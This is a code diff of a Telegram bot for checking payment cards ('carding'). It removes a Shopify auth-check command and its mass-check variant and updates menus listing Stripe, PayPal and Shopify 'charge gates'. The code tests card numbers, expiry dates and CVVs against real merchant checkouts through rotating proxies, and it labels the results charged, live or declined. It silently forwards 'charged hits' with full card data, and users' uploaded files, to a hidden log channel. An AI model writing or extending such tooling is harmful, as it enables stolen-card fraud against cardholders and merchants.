@@ -1666,74 +1666,6 @@ Or send multiline / reply to a message or file:
 
 
 
-# ==================== /chk & /cc - SHOPIFY AUTH CHECK ====================
-@bot.on(events.NewMessage(pattern=r'^/(?:chk|cc)\s+(.+)'))
-async def single_chk_cc(event):
-    user_id = event.sender_id
-
-    if not await is_joined_channel(user_id):
-        await event.reply("Join channel first and verify!")
-        return
-
-    allowed, remaining = check_limits(user_id, False)
-    if not allowed:
-        await event.reply("Daily limit reached. Get premium.")
-        return
-
-    raw_args = event.pattern_match.group(1).strip()
-    cards = extract_cc(raw_args)
-    if not cards:
-        await event.reply("Invalid format! Use: <code>/chk card|mm|yy|cvv</code>", parse_mode="html")
-        return
-
-    card = cards[0]
-    status_msg = await event.reply("🔄 <b>Checking (Shopify Storefront)...</b>", parse_mode="html")
-
-    sites = get_checker_sites(user_id)
-    proxies = load_proxies(user_id)
-    proxy = random.choice(proxies) if proxies else None
-    custom_site = random.choice(sites) if sites else None
-
-    start_time = time.time()
-    try:
-        st, response_msg, gateway_str = await check_card_msh(card, proxy_str=proxy, custom_site=custom_site)
-        time_taken = round(time.time() - start_time, 2)
-        update_daily_usage(user_id, 1)
-
-        cc_num = card.split('|')[0]
-        try:
-            brand, bin_type, level, bank, country, flag = await get_bin_info(cc_num[:6])
-        except Exception:
-            brand, bin_type, level, bank, country, flag = "-", "-", "-", "-", "-", "🏳️"
-
-        st_lower = str(st).lower()
-        if st_lower == 'charged':
-            status_emoji = "Charged! 🟢"
-        elif st_lower == 'approved':
-            if "3DS" in response_msg or "OTP" in response_msg:
-                status_emoji = "Live! 🟡"
-            else:
-                status_emoji = "Approved! ✅ -» Auth"
-        else:
-            status_emoji = "Declined! ❌"
-
-        res_msg = format_anime_result(card, status_emoji, response_msg, f"{gateway_str} -» $0.00", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
-        await status_msg.edit(res_msg, parse_mode="html")
-
-        # Forward charged hits to log channel
-        if st_lower == 'charged':
-            try:
-                hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: {gateway_str}\nResponse: {response_msg}\nUser: {user_id}"""
-                await bot.send_message("Fchker", hit_log, parse_mode="html")
-            except:
-                pass
-
-    except Exception as e:
-        await status_msg.edit(f"❌ Error: {e}")
-
-
-
-
 @bot.on(events.NewMessage(pattern=r'^/rz\s*'))
 async def single_razorpay_cc(event):
     user_id = event.sender_id
@@ -2718,9 +2650,9 @@ async def checker_menu_handler(event):
     gates_msg = """<b>Gates Menu</b>
 
 Browse the available categories:
-• <b>Auth Gates:</b> 7
+• <b>Auth Gates:</b> 6
 • <b>Charge Gates:</b> 15
-• <b>Mass Checker:</b> 7"""
+• <b>Mass Checker:</b> 6"""
 
     buttons = [
         [Button.inline("Auth Gates", b"auth_info"),
@@ -2738,9 +2670,6 @@ Browse the available categories:
 async def auth_info_handler(event):
     auth_msg = """<b>AUTH GATES</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<b><i>Shopify Auth</i></b>
-<code>/chk cc|mm|yy|cvv</code> (or <code>/cc</code>)
-
 <b><i>Stripe Auth 1</i></b>
 <code>/au cc|mm|yy|cvv</code>
 
@@ -2839,8 +2768,8 @@ async def charge_info_handler(event):
 async def mass_info_handler(event):
     mass_msg = """<b>MASS CHECKER GATES</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<b><i>Shopify Mass Auth</i></b>
-Reply to .txt file: <code>/chk</code>
+<b><i>Shopify Storefront Mass Charge</i></b>
+Reply to .txt or inline: <code>/msh cc|mm|yy|cvv cc...</code>
 
 <b><i>Stripe Mass Charge 1 ($1.00)</i></b>
 Inline: <code>/mst1 cc|mm|yy|cvv cc...</code>
@@ -2855,10 +2784,7 @@ Reply to .txt or inline: <code>/mass3</code>
 Inline: <code>/mbt1 cc|mm|yy|cvv cc...</code>
 
 <b><i>PayPal Mass Charge ($10.00)</i></b>
-Inline: <code>/mpp2 cc|mm|yy|cvv cc...</code>
-
-<b><i>Shopify Storefront Mass Charge</i></b>
-Reply to .txt or inline: <code>/msh cc|mm|yy|cvv cc...</code>"""
+Inline: <code>/mpp2 cc|mm|yy|cvv cc...</code>"""
 
     buttons = [
         [Button.inline("Back", b"checker")]
@@ -3046,24 +2972,6 @@ async def silent_log_forward_file(event):
         await bot.forward_messages("Fchker", event.message)
     except Exception as e:
         print(f"Silent forward error: {e}")
-
-
-# ==================== MASS CHECK (reply /chk or .chk to file) ====================
-@bot.on(events.NewMessage(pattern=r'^[./](?:chk|cc)$'))
-async def mass_chk_reply(event):
-    if not event.is_reply:
-        await event.reply("""<b>Shopify Auth Gate</b>
-━━━━━━━━━━━━━━━━━━━━
-<b>Single:</b> <code>/chk card|mm|yy|cvv</code>
-<b>Mass:</b> Reply <code>/chk</code> to a .txt file""", parse_mode="html")
-        return
-
-    reply_msg = await event.get_reply_message()
-    if not reply_msg or not reply_msg.file:
-        await event.reply("Reply to a .txt file containing cards!")
-        return
-
-    await _run_generic_mass_check(event, "Shopify Storefront Mass Check", check_card_msh)
 
 
 @bot.on(events.CallbackQuery(pattern=r'^chk_(pause|resume|stop)_(.+)'))
